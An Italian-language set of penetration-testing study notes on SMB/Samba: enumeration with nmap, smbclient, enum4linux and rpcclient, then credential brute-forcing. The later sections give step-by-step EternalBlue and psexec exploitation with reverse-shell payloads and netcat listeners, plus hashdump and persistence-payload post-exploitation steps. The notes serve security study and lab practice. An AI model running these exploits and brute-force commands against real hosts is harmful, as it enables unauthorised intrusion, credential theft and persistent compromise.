<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# SMB & Samba Enumeration & Exploitation

**SMB (Server Message Block)** è un protocollo di rete utilizzato principalmente nei sistemi Windows per la condivisione di file, stampanti e altre risorse. <br>
**Samba** è la sua implementazione libera in ambiente Linux/Unix, consentendo l’interoperabilità tra Windows e Linux. Entrambi operano sulle porte `445/TCP` (moderno, SMB Direct) e `139/TCP` (legacy, via NetBIOS). <br>

Un tempo SMB e NetBIOS erano strettamente legati: SMB sfruttava il protocollo NetBIOS per funzionare. Oggi, le reti moderne utilizzano SMB su porta 445 bypassando NetBIOS, che tuttavia può essere ancora rilevante in ambienti legacy o non aggiornati. 

---

## NetBIOS – Architettura e Rilevanza

**NetBIOS (Network Basic Input/Output System)** è un’API e set di protocolli utilizzato per consentire la comunicazione tra dispositivi in una rete locale. Offre tre principali servizi:

- **Name Service (NetBIOS-NS)** – usa la porta `137` per risolvere nomi host su reti locali (in passato utilizzato al posto del DNS);
- **Datagram Service (NetBIOS-DGS)** – usa la porta `138`, fornisce comunicazione connectionless e broadcasting per servizi tipo messaggistica;
- **Session Service (NetBIOS-SSN)** – opera sulla porta `139`, usato per comunicazioni orientate alla connessione.

Quando effettuiamo una scansione Nmap sulla porta 139, spesso il servizio restituito è proprio `netbios-ssn`, indicando l’attività di NetBIOS Session Service.

Per analizzare NetBIOS possiamo usare `nbtscan`, uno scanner leggero per identificare host che pubblicano nomi NetBIOS:

- `nbtscan <IP>` ⟶ scansione base per identificare nomi NetBIOS.
- `nbtscan -r <subnet>` ⟶ scansione ricorsiva di una subnet.
- `nbtscan -v <IP>` ⟶ output dettagliato con informazioni aggiuntive.

---

## Fase 1 – Scansione e Identificazione del Servizio

Per rilevare la presenza del servizio SMB/Samba e identificarne la versione:

`nmap -sV -p139,445 <target>` ⟶ rileva SMB sulle porte NetBIOS e SMB Direct

Script NSE utili:
- `nmap --script smb-os-discovery <target>` ⟶ sistema operativo, dominio, NetBIOS
- `nmap --script smb-enum-shares <target>` ⟶ condivisioni disponibili
- `nmap --script smb-enum-users <target>` ⟶ utenti configurati
- `nmap -p445 --script smb-vuln-ms17-010 <IP>` ⟶ verifica EternalBlue
- `nmap -p445 --script=smb-protocols <IP>` ⟶ protocolli supportati (NTLM, LM, SMB1/2/3)
- `nmap -p445 --script=smb-security-mode <IP>` ⟶ modalità di sicurezza attiva (autenticazione, accessi anonimi, ecc.)

Con Metasploit:
- `use auxiliary/scanner/smb/smb_version` ⟶ verifica versione SMB
- `use auxiliary/scanner/smb/smb_enum_users` ⟶ enumerazione utenti
- `use auxiliary/scanner/smb/smb_enumshares` ⟶ enumerazione condivisioni
- `use auxiliary/scanner/smb/smb_ms17_010` ⟶ verifica vulnerabilità EternalBlue

Per cercare exploit relativi:
`searchsploit samba <versione>`

Versioni vulnerabili comuni:
- **SMBv1** ⟶ EternalBlue (MS17-010)
- **Windows XP/2003/7 non patchati** ⟶ buffer overflow
- **vsrvsvc** ⟶ vulnerabilità RPC

Versioni SMB:
- **SMB 1.0** ⟶ insicuro, supporta accessi anonimi, molte vulnerabilità.
- **SMB 2.0/2.1** ⟶ introdotti con Windows Vista e Server 2008, migliorie in sicurezza e prestazioni.
- **SMB 3.0+** ⟶ da Windows 8 in poi, supporto crittografia, multicanale, virtualizzazione.

---

## Fase 2 – Enumerazione Manuale del Servizio

### smbclient
Client simile a FTP per connettersi e interagire con le share:
- `smbclient -L //<target>/ -N` ⟶ condivisioni anonime
- `smbclient -L <IP> -U <username>` ⟶ share disponibili per utente
- `smbclient //<target>/<share> -U <username>` ⟶ accesso alla share

Comandi interni:
- `?`, `ls`, `get <file>`, `put <file>`, `cd`, `mkdir`, `rmdir`

> File come `*.tar.gz` possono essere estratti con `tar xzf file.tar.gz`

### smbmap
Consente di elencare share e permessi associati:
- `smbmap -H <IP> -u <username> -p <password>`

Permessi comuni:
- `R` = lettura, `W` = scrittura, `-` = nessun accesso

### enum4linux
Strumento completo basato su `smbclient`, `rpcclient`, `nmblookup`:
- `enum4linux -a <IP>` ⟶ utenti, share, NetBIOS, gruppi, policy

> Se usato con credenziali valide, fornisce output molto più dettagliato.

### rpcclient
Permette l’interazione con i servizi RPC via SMB:
- `rpcclient -U "" <IP>` ⟶ connessione null session
- Comandi: `enumdomusers`, `enumdomgroups`, `queryuser <RID>`

---

## Fase 3 – Verifica Null Session

Una **null session** è una connessione SMB senza credenziali, potenzialmente utile per ottenere:
- Nomi utenti
- Share
- Informazioni di dominio

Test:
- `rpcclient -U "" <target>`
- `smbclient -L //<target>/ -N`

---

## Fase 4 – Brute Force delle Credenziali

### Con Hydra
`hydra -L <userList> -P <passwordList> <IP> smb` ⟶ attacco SMB/Samba

### Con Metasploit
`use auxiliary/scanner/smb/smb_login`<br>`set RHOSTS <IP>`<br>`set USER_FILE <user_list>`<br>`set PASS_FILE <pass_list>`<br>`run`<br>

### Con CrackMapExec
- `crackmapexec smb <target> -u <user> -p <password>` ⟶ verifica credenziali
- `crackmapexec smb <target> --shares` ⟶ elenca condivisioni
- `crackmapexec smb <target> --users` ⟶ enumera utenti

---

## Fase 5 – Exploitation

### Exploit EternalBlue (MS17-010)

**EternalBlue** è una vulnerabilità critica identificata come **MS17-010** che colpisce il protocollo **SMBv1** su sistemi Windows non aggiornati (XP, 2003, 7). <br>
Questa vulnerabilità consente l'esecuzione di codice da remoto (**RCE**) senza autenticazione, sfruttando un bug nei pacchetti SMB. <br>
È diventata celebre in quanto utilizzata dal worm **WannaCry**. <br>
EternalBlue è sfruttabile solo se il servizio SMBv1 è attivo e non patchato.

Con Metasploit:<br>`use exploit/windows/smb/ms17_010_eternalblue`<br>`set RHOSTS <IP>`<br>`set SMBPIPE BROWSER`<br>`set PAYLOAD windows/x64/meterpreter/reverse_tcp`<br>`set LHOST <KaliIP>`<br>`set LPORT <Port>`<br>`run`<br>

Una volta ottenuta la shell:
- `getuid`, `getprivs`, `hashdump`

### AutoBlue-MS17-010

**AutoBlue-MS17-010** è uno script Python che automatizza lo sfruttamento della vulnerabilità EternalBlue. <br>
È particolarmente utile in contesti dove non si usa Metasploit o si preferisce una procedura manuale e più trasparente.

```bash
cd AutoBlue-MS17-010/shellcode
chmod +x shell_prep.sh
./shell_prep.sh
nc -nvlp 4444
python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin
```

AutoBlue può essere utilizzato per generare shellcode, avviare listener e inviare l’exploit, e funziona efficacemente su macchine non patchate vulnerabili a MS17-010 con SMBv1 attivo.

### PsExec (Metasploit)
`use exploit/windows/smb/psexec`<br>`set RHOSTS <IP>`<br>`set SMBUser <username>`<br>`set SMBPass <password>`<br>`set PAYLOAD windows/meterpreter/reverse_tcp`<br>`set LHOST <KaliIP>`<br>`set LPORT <Port>`<br>`run`<br>

### Impacket – psexec.py
`psexec.py <username>@<IP> cmd.exe`⟶ accesso CMD remoto via SMB

Percorso tipico: `/usr/share/doc/python3-impacket/examples/psexec.py`

---

## Fase 6 – Post Exploitation

Dopo l’accesso:
- Scarica `.txt`, `.conf`, `.xml`, `.ini`, `.bak`
- Carica payload/script di persistence
- Verifica se le share sono usate da processi attivi o servizi web

Comandi utili:
- `wget smb://<IP>`
- `curl smb://<IP>`
- `lftp <IP>`
